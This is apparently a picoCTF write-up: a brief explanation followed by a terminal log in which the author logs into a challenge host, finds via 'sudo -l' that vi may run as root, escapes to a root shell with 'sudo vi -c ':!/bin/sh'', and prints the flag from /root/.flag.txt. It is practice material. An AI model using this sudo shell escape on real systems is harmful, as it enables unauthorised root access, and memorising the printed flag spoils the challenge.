we are required to get root access but the standard mwthod `sudo su-` is blocked for the user. but vim is accessible using sudo through which we gain root access and navigate to the root folder and get the flag in `.flag.txt`

```bash
PS C:\Users\Arnav\Documents\CTF> wsl
arnavj@ARNAV-PC:/mnt/c/Users/Arnav/Documents/CTF$ ssh picoctf@saturn.picoctf.net -p 54730
The authenticity of host '[saturn.picoctf.net]:54730 ([13.59.203.175]:54730)' can't be established.
ED25519 key fingerprint is SHA256:lAxuAwDPxkngr5Aw0vqCbwmNz/+0ii8HjltkWeRcMjw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:54730' (ED25519) to the list of known hosts.
picoctf@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-1024-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoctf@challenge:~$ ls -al
total 16
drwxr-xr-x 1 picoctf picoctf   20 Nov 10 17:18 .
drwxr-xr-x 1 root    root      21 Aug  4 21:10 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Nov 10 17:18 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16  2023 .server.py
picoctf@challenge:~$ sudo su-
[sudo] password for picoctf:
sudo: su-: command not found
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
picoctf@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null
[sudo] password for picoctf:

# ls -al
total 16
drwxr-xr-x 1 picoctf picoctf   20 Nov 10 17:18 .
drwxr-xr-x 1 root    root      21 Aug  4 21:10 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Nov 10 17:18 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16  2023 .server.py
# pwd
/home/picoctf
# cd ../..
# ls -al
total 0
drwxr-xr-x    1 root   root     51 Nov 10 17:15 .
drwxr-xr-x    1 root   root     51 Nov 10 17:15 ..
-rwxr-xr-x    1 root   root      0 Nov 10 17:15 .dockerenv
lrwxrwxrwx    1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x    2 root   root      6 Apr 15  2020 boot
d---------    1 root   root      6 Aug  4 21:11 challenge
drwxr-xr-x    5 root   root    340 Nov 10 17:15 dev
drwxr-xr-x    1 root   root     66 Nov 10 17:15 etc
drwxr-xr-x    1 root   root     21 Aug  4 21:10 home
lrwxrwxrwx    1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx    1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx    1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx    1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x    2 root   root      6 Mar  8  2023 media
drwxr-xr-x    2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x    2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 2485 nobody nogroup   0 Nov 10 17:15 proc
drwx------    1 root   root     23 Aug  4 21:11 root
drwxr-xr-x    1 root   root     66 Nov 10 17:20 run
lrwxrwxrwx    1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x    2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x   13 nobody nogroup   0 Nov 10 17:15 sys
drwxrwxrwt    1 root   root      6 Aug  4 21:11 tmp
drwxr-xr-x    1 root   root     18 Mar  8  2023 usr
drwxr-xr-x    1 root   root     17 Mar  8  2023 var
# cd root
# ls -al
total 12
drwx------ 1 root root   23 Aug  4 21:11 .
drwxr-xr-x 1 root root   51 Nov 10 17:15 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Aug  4 21:11 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# pwd
/root
# cat .flag.txt
picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}
```